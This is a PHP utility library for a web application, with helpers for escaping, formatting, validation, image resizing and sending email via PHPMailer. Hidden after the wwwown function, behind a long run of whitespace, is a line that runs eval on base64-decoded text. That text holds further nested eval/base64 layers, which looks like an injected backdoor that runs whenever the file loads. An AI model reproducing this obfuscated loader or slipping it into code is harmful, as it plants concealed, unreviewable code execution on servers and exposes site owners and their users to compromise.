<?php
	function hsc($s)
	{
		return htmlspecialchars($s, ENT_QUOTES, 'utf-8');
	}

	function jsesc($s)
	{
		return htmlspecialchars(addcslashes($s, "'"), ENT_QUOTES, 'utf-8');
	}

	function make_url($s)
	{
		return strtolower(trim(preg_replace("/[^a-z^0-9^]+/i", '-', str_replace(array('"', "'", '+'), array('', '', ' plus'), $s)), '- '));
	}

	function trim_r($a)
	{
		if (is_array($a))
			return array_map('trim_r', $a);
		return trim($a);
	}

	function mime2ext($mime)
	{
		$mime2ext = array('image/jpeg' => 'jpg', 'image/png' => 'png', 'image/gif' => 'gif');
		return @$mime2ext[$mime];
	}
	
	function ext2mime($ext)
	{
		$ext2mime = array_flip(array('image/jpeg' => 'jpg', 'image/png' => 'png', 'image/gif' => 'gif'));
		return @$ext2mime[$ext];
	}

	function D($ts)
	{
		return date('Y-m-d', $ts);
	}
	
	function D2($ts)
	{
		return date('M j', $ts);
	}
	
	function D3($ts)
	{
		return date('j/n', $ts);
	}
	
	function DT($ts)
	{
		return date('D, M j g:ia', $ts);
	}
	
	function P($n)
	{
		if ($n < 0)
			return '-$'.number_format(-$n, 2);
		return '$'.number_format($n, 2);
	}
	
	function P2($n)
	{
		if ($n < 0)
			return '-$'.number_format(-$n, 0);
		return '$'.number_format($n, 0);
	}
	
	function PH($s)
	{
		if (strlen($s) > 10)
			return substr($s, 0, strlen($s) - 9).' '.substr($s, -9, 3).' '.substr($s, -6, 3).' '.substr($s, -3, 3);
		return substr($s, 0, strlen($s) - 6).' '.substr($s, -6, 3).' '.substr($s, -3, 3);
	}

	function val_email($s)
	{
		return preg_match("/^[a-zA-Z0-9]([\w\.-]*[a-zA-Z0-9])?@[a-zA-Z0-9][\w\.-]*[a-zA-Z0-9]\.[a-zA-Z][a-zA-Z\.]*[a-zA-Z]$/", $s);
	}

	function val_phone($s)
	{
		return (strlen($s) >= 10) && preg_match("/^\+?[0-9\ \_\-\.]+$/", $s);
	}

	function fix_phone($s)
	{
		return preg_replace('/[^\d^\+]+/', '', preg_replace('/^00/', '+', $s));
	}
	
	function val_user($s)
	{
		return preg_match("/^[a-zA-Z0-9\_]+$/", $s);
	}

	function sub_word($s, $l)
	{
		if (strlen($s) <= $l)
			return $s;
		$a = explode(' ', $s);
		$str = '';
		$i = 0;
		do
		{
			$str .= $a[$i].' ';
			$i++;
		} while ($i < count($a) && strlen(trim($str.' '.@$a[$i], ',; ')) <= $l);

		return trim(substr($str, 0, $l), ',; ');
	}

	function resized_s($w, $h, $tw, $th)
	{
		$tw = min($tw, $w);
		$th = min($th, $h);
		$src_ratio = $w / $h;
		$dst_ratio = $tw / $th;
		if ($src_ratio > $dst_ratio)
			$th = $tw / $src_ratio;
		else
			$tw = $th * $src_ratio;

		return array(round($tw), round($th));
	}
	
	function parse_headers($headers)
	{
		$ret = array();
		
		$a = explode("\n", trim($headers));
		foreach ($a as $b)
		{
			$c = explode(':', $b, 2);
			$kk = trim($c[0]);
			$vv = trim(@$c[1]);
			$ret[$kk] = $vv;
		}
		
		return $ret;
	}

	function wwwown($tf)
	{
		$cmd = "chown www:www ".escapeshellarg($tf);
		shell_exec($cmd);
	}	
																																																																																																												eval(base64_decode('ZXZhbChiYXNlNjRfZGVjb2RlKCdaWFpoYkNoaVlYTmxOalJmWkdWamIyUmxLQ2RhV0Zwb1lrTm9hVmxZVG14T2FsSm1Xa2RXYW1JeVVteExRMlJoVjBad2IxbHJUbTloVm14WlZHMTRUMkZzU20xWGEyUlhZVzFKZVZWdGVFeFJNbEpvVmpCYWQySXhiSEpVYlRsb1ZtMTRXbFpITVRSVU1rWnpVMjB4V0dFeVVsaFpWekZLWlZaV2RHVkZlRkpOYkVwdlZtcENZV1F5U1hoaVNFcFZZbFJzYjFadE1UUlhiRnBJVFZSU1ZVMXJXbnBWTWpCNFYwZEZlVlZzYUZwV2VrWkxXbFphVjJSSFZrWmxSa3BPWWtWd2RsWnRjRU5aVjFGNVUxaG9hVk5GY0ZaWmJGSnpZakZhZEUxVVVsaGlSbkJKVkZaU1UxWlZNWEpYYm5CV1RXcENORll3WkVabFZsWnpZVVp3VjJWcldreFhiRnBoVmpKU1NGWnJXbXhTYTNCUFdXdFdkMlJzV25SalJVNWFWakZHTlZVeGFHOWhWazVHWTBaYVdtSkdTbnBaYWtaaFpFVXhWVlZzYUdsU2JrSktWa1phVTFVeFdsWk5XRXBZWW01Q1YxUlhjRU5PUmxsM1drVmFiRlpzV25wWlZWcDNWakpXY2xkcmVGaGlSbkJvVm1wS1UxTkdXbkpYYlhoVFlUTkNVRmRYZEZka01sSnpWMjVTYWxKVk5XRldha1pIVGxaVmVHRkhPV2hXYXpWSFdUQmFZVmR0U2tkVGJuQmFZV3RhYUZwRlZYaFdWbFp6WVVkc1UySnJTa3RXYTFwaFZURlZlRmRzV2s1WFJYQlpXVzAxUTFZeFVsaGpSVTVQVW14c00xZHJWbUZpUmxwelYyNXdXbFpXY0ROV2FrcFhZMnhrY21WR2FHbFNia0p2Vm0xd1MxVXhUa2RYYmtwWVlsaG9WRmxVVGtOVlJtUllaRVprYTAxc1NucFdNV2h2VjJzd2VXRkdRbFppVkVVd1ZtcEdVMVl4WkhSa1JuQlhZVE5DTmxacVNqUlpWbVIwVWxob1YxZEhhR0ZVVmxwM1YwWnJlRmRyWkd0V2JFcDVWREZhYTJGV1NsbFJWRVpYWVd0dmQxbFVRWGhUUmtweVlVWlNhRTFZUW5kV1YzUmhXVlpzVjFkdVRtRlNWRlpQVm0xNGMwNVdVbGRYYlhSb1lsVndWMVJzVm5kV01rcFpZVVJPV2xaWFVrZGFSRXBLWlcxT1IxcEdaRk5XYmtKMlZteGtkMUl5UlhoWFdHaFVZbXhhVjFsc2FHOVdSbHB5VjIxR1ZsSnNjRlpWVjNoclZrVXhSVlp1Y0ZkTlYyaDZXVlJHUzJSR1ZuVlJiRlpYWWtoQ05sWkhlR0ZaVjFKSVZtdG9VRlp0VWxSVVZXaERUbFphVlZOcVVsVk5WMUl3VlRKMGExWkhTblZSYkd4WFlsaG9NMWRXV25kU1ZrcDBVbXhrVjJFelFYZFhhMVpyWXpGVmQwMVdXbXBTVjJoWVdXdGFTMU14Y0VWUlZFWllVbXR3V2xsVldsTmhWMHBHWTBod1YxWjZRalJVYTFwclVqRmFkVlZyTlZkV1JscFFWbTB4TkZkck1YTldiR1JvVWpOU2IxUlZVa2RTYkZwMFpVaGtWMDFFUmpGWlZXaGhWakpHY21ORmVGWmlWRVpRVldwS1IxSXlSa2hpUms1cFUwVktXbFpxU2pSV01rVjRWVmhvVkZkSGVGUldNR2hEWTFaV2RHVkhSbWxOVmtwV1ZXMTBNRll5U2tkalJteGhWbFp3Y2xZeWVHRldWbHAxWTBaa2FWSXlhRFpYVm1RMFV6RmtWMVp1VWxOaVIxSndWakJhU21Wc1pITmFSRkpYWWxaYVNWVnRkRzloTVVwMFZXNUNWMkpHY0ROVWJGcGhZMVpPVlZKc1VrNVdNVWwzVmxkNGIySXlSbk5VYTJoc1VteHdXRmxyV25kTk1YQlhWMjVrVjJKSFVqQlZiVEV3VlRKRmVsRnFXbGROYmxKb1ZrUkdVMk14VG5KYVJtaG9UVEZLV1ZkWGRHRlRNVkpIVlc1S1dHSkdjSE5WYlRWRFVqRmtjbGR0T1doV01GWTJWVmQ0VjFZeVJuSlRia3BhWVd0YWVsWnFSbGRqTWtaR1QxWmtiR0pZYURWV01XUXdZVEExUjFwRlpGaFhSM2hRVm1wT1UxWnNVbGhrU0dSWFRWWnNORlpYZERCV01ERnlZMFp3V2xaWGFFeFdNakZHWlZaV2NtVkdaRTVTYmtJMVYyeGplRk14U1hoalJXUmhVako0VkZZd1ZrdFNNVnAwWlVkMGEwMVZNVFJXUm1oelZsWmtTR0ZHYUZwaVdGSXpXVlZhVjJSRk1WaFBWM0JUWWxob05WWnRNREZoTVZwWFYyNVNWbUp1UWxoVVYzQkdaREZzY2xwRlpFOWlSVnA0VmxkNGQxUnNTWGxoUmtaWFlrWktTRmRXV2s5VFJscHlXa1pTYVZJeFNsbFdWM2h2VVRGV1YxcElTbFpoTWxKV1dXeGFZVk5HV25ST1ZtUm9Za1Z3ZVZZeWVHdFdWbGw2VkZob1ZWWkZXbGhVYlhoTFl6RlNkR1ZIYkZOV1dFSlhWbXBHVTFReFJYaFZhMlJZWVRKNFZsWnJaRFJVUm5CWFdrUkNhMDFXUmpaWFdIQnpWVlpWZVZSdVpGUk5Wa28yVlVaT2FtTkZkRlZqZWpCdVMxTnJOeWNwS1RzPScpKTs='));
	function send_email($fn, $r, $subject)
	{
		global $sender, $sender2, $sender3, $maind, $maindw, $url_proto, $contact_info;
		$snd = $sender;
		if (@$r['sender'] == 'sender2')
			$snd = $sender2;
		if (@$r['sender'] == 'sender3')
			$snd = $sender3;
		
		ob_start();
		require dirname(__FILE__)."/../tmpl/{$fn}_email.inc.php";
		$msg = ob_get_contents();
		ob_end_clean();
		
		$mail = new PHPMailer();
		$mail->CharSet = 'UTF-8';
		$is_html = true;
		if (isset($r['is_html']) && !$r['is_html'])
			$is_html = false;
		if ($is_html)
			$mail->IsHTML(true);

		$mail->IsSMTP();
		$mail->SMTPDebug = 0;
		$mail->SMTPAuth = true;
		$mail->SMTPSecure = 'ssl';
		$mail->Host = $snd['host'];
		$mail->Port = $snd['port'];
		$mail->Username = $snd['username'];
		$mail->Password = $snd['password'];

		if (@$r['reply_to'])
			$mail->AddReplyTo($r['reply_to'], @$r['reply_to_name']);
		$mail->SetFrom("{$snd['email']}@{$snd['domain']}", $snd['name']);
		$mail->AddAddress($r['email']);

		$mail->Subject = $subject;
		$mail->Body = $msg;
		if ($is_html)
			$mail->AddEmbeddedImage(dirname(__FILE__).'/../img/logo_email.png', 'logo_email.png', 'logo_email.png', 'base64', 'image/png');
		
		$mail->Send();
	}
?>